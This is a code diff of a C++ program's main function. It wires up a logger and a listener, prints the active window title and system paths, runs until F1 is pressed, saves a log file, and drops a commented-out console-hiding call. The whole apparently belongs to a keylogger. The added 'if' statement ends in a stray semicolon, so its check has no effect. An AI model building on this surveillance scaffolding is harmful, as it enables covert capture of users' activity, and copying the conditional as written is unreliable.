@@ -10,23 +10,27 @@ using namespace std;
 int main()
 {
 	// Start logger and listener
-	Logger logger("test.log");
+	Logger logger;
 	Listener listener(&logger);
 
 	cout << Utilities::GetCurrentDate() << endl;
 	cout << Utilities::GetTime() << endl;
+	cout << Utilities::GetActiveWindow() << endl;
+	cout << Utilities::GetProgramFilePath() << endl;
+	cout << Utilities::GetSystemDir() << endl;
 	
-	logger.LoadMapFromFile();
-
-	cout << logger.GetLog() << endl;
+	// If available load log from file and display it to screen 
+	if(logger.LoadMapFromFile());
+		cout << logger.GetLog() << endl;
 
 	// Start listening
 	listener.Start();
 
+	// If F1 pressed
 	cout << "EXITING!" << endl;
 
+	// Save log to file
 	logger.SaveMapToFile();
 
-	//Utilities::HideConsole();
 	return 0;
 }
